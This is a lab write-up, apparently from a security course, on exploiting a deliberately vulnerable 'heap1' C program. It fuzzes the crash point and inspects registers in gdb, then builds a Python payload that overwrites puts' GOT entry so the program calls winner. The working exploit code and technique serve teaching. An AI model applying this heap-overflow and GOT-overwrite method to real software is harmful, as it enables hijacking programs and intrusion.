### 7. Heap Overflow

In this program, we can't just change the function pointer inside the data structure. We will take advantage of another overflow to write whatever we want to memory.

##### Getting the program
```
curl https://samsclass.info/127/proj/heap1.c > heap1.c
gcc heap1.c -no-pie -w -g -fno-stack-protector -z norelro -z execstack -o heap1
```

##### Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
 int priority;
 char *name;
};

void winner()
{
 printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
 struct internet *i1, *i2, *i3;

 i1 = malloc(sizeof(struct internet));
 i1->priority = 1;
 i1->name = malloc(8);

 i2 = malloc(sizeof(struct internet));
 i2->priority = 2;
 i2->name = malloc(8);

 strcpy(i1->name, argv[1]);
 strcpy(i2->name, argv[2]);

 printf("and that's a wrap folks!\n");
}
```

The vulnerability is on line 29. We are copying the command line argument into the heap data structure without checking the bounds. This will allow us to overflow and corrupt the heap meta data.

##### Verifying the vulnerability

After some basic fuzzing, we discover that the program crashes if the **first** argument is too long. That tracks with the code as well, since the first data structure is stored on the heap before the second.

```
$ alias p8heap="env - PWD=$PWD /full/path/to/heap1"

$ p8heap AAAA BBBB
and that's a wrap folks!
p$ p8heap AAAAAAAAAAAAAAAAAAAAAAAA BBBB
Segmentation fault (core dumped)
$ p8heap AAAA BBBBBBBBBBBBBBBBBBBBBBBB
and that's a wrap folks!
```

##### Exploit script

Let's find out when the program crashes exactly. We can automate this fuzzing of the first argument:

```
#!/usr/bin/python

import subprocess
import sys

def execute():
	arg = "AAAA"
	while True:
		run(arg)
		arg += "AAAA" 

def run(arg):
	p = subprocess.Popen(["./heap1", arg, "BBBB"], stdout=subprocess.PIPE)
	output, err = p.communicate()
	if "wrap" in output:	
		print("[x] Passed with arg {} (len: {})".format(arg, len(arg)))
	else:
		print("[!] Crashed with arg {} (len: {})".format(arg, len(arg)))
		sys.exit()
```
```
$ ./exploit.py 1
[x] Passed with arg AAAA (len: 4)
[x] Passed with arg AAAAAAAA (len: 8)
[x] Passed with arg AAAAAAAAAAAA (len: 12)
[x] Passed with arg AAAAAAAAAAAAAAAA (len: 16)
[x] Passed with arg AAAAAAAAAAAAAAAAAAAA (len: 20)
[!] Crashed with arg AAAAAAAAAAAAAAAAAAAAAAAA (len: 24)
```

##### Debugging the program

Now that we know the program crashes with an input of 24, let's use a pattern string and inspect the program in the debugger when this happens.

```
#!/usr/bin/python

payload = "".join([c * 4 for c in "ABCDEF"]) + " BBBB"

def execute():
	with open("exploit", "wb") as f:
		f.write(payload)
		print("Wrote {} payload to file.".format(__name__))
```

```
./exploit.py 2
env - gdb
source ~/.gdbinit
file heap1
run $(cat exploit)
```

The program crashes shortly after. Let's see why:

```
gdb-peda$ x/2i $eip
=> 0xb7e6e122 <__strcpy_sse2+1202>:     mov    DWORD PTR [edx],eax
   0xb7e6e124 <__strcpy_sse2+1204>:     mov    al,BYTE PTR [ecx+0x4]
```
The program is crashing when it tries to copy the value of EAX into memory at the location stored in EDX.
Let's see what these registers contain.
```
gdb-peda$ context registers
EAX: 0x42424242 ('BBBB')
EDX: 0x46464646 ('FFFF')
```

It looks like EAX is storing our second argument, and EDX bytes 21-24 of our first argument.
If we replace EDX with an address, we can write the contents of the second argument to that location!

##### Overwriting memory

If we disassemble main, we can see a call to puts@plt. Let's overwrite the pointer in this function to instead call winner.

We need the addresses of puts and the winner function.
```
$ objdump -R heap1 | grep puts
08049910 R_386_JUMP_SLOT   puts@GLIBC_2.0

$ objdump -S heap1 | grep winner
080484c6 <winner>:
```

Now, let's update our exploit script:

```
#!/usr/bin/python

import struct

def execute():

	target_address = struct.pack("I", 0x08049910) # puts
	data = struct.pack("I", 0x080484c6)	
	
	# mov [edx], eax
	payload = "A" * 20
	payload += target_address # edx
	payload += " "
	payload += data # eax

	write_exploit(payload)

def write_exploit(payload):
	with open("exploit", "wb") as f:
		f.write(payload)
		print("Wrote {} payload to file.".format(__name__))
```

Let's run it and see what happens.

```
$ ./exploit.py 3
Wrote exploit3 payload to file.

$ p8heap $(cat exploit)
and we have a winner @ 1560950686
```

Success!
